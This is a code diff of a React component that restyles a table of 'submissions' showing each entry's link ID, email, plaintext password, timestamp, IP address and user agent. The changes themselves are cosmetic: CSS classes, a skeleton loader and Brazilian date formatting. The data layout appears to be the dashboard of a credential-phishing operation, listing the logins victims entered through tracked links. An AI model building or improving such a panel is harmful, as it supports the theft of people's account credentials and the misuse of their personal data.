@@ -1,4 +1,5 @@
 import React, { useEffect, useState } from "react";
+import { Skeleton } from "../ui/skeleton";
 
 const SubmissionsTable = () => {
   const [rows, setRows] = useState([]);
@@ -12,39 +13,37 @@ const SubmissionsTable = () => {
       .finally(() => setLoading(false));
   }, []);
 
-  if (loading) return <div>Loading…</div>;
-
   const fmt = (iso) => {
     const d = new Date(iso);
-    return isNaN(d) ? "-" : d.toLocaleString();
+    return isNaN(d) ? "-" : d.toLocaleString("pt-BR", { hour12: false });
   };
 
+  if (loading) return <Skeleton className="h-32 w-full rounded-xl" />;
+
   return (
-    <div className="table-container">
-      <table>
+    <div className="overflow-auto rounded-xl border">
+      <table className="min-w-full text-sm whitespace-nowrap">
         <thead>
-          <tr>
-            <th>ID</th>
-            <th>Link&nbsp;ID</th>
-            <th>Email</th>
-            <th>Password</th>
-            <th>Timestamp</th>
-            <th>IP&nbsp;Address</th>
-            <th>User&nbsp;Agent</th>
+          <tr className="bg-muted/50 text-left text-xs uppercase tracking-wider">
+            <th className="px-3 py-2">ID</th>
+            <th className="px-3 py-2">Link ID</th>
+            <th className="px-3 py-2">Email</th>
+            <th className="px-3 py-2">Password</th>
+            <th className="px-3 py-2">Timestamp</th>
+            <th className="px-3 py-2">IP</th>
+            <th className="px-3 py-2">User Agent</th>
           </tr>
         </thead>
         <tbody>
           {rows.map((r) => (
-            <tr key={r.id}>
-              <td>{r.id}</td>
-              <td>{r.link_id}</td>
-              <td>{r.email}</td>
-              <td>{r.password}</td>
-              <td>{fmt(r.timestamp)}</td>
-              <td>{r.ip_address || "-"}</td>
-              <td style={{ maxWidth: 320, wordBreak: "break-all" }}>
-                {r.user_agent || "-"}
-              </td>
+            <tr key={r.id} className="hover:bg-gray-50">
+              <td className="px-3 py-2">{r.id}</td>
+              <td className="px-3 py-2">{r.link_id}</td>
+              <td className="px-3 py-2">{r.email}</td>
+              <td className="px-3 py-2">{r.password}</td>
+              <td className="px-3 py-2">{fmt(r.timestamp)}</td>
+              <td className="px-3 py-2">{r.ip_address || "-"}</td>
+              <td className="px-3 py-2 max-w-xs break-all">{r.user_agent || "-"}</td>
             </tr>
           ))}
         </tbody>
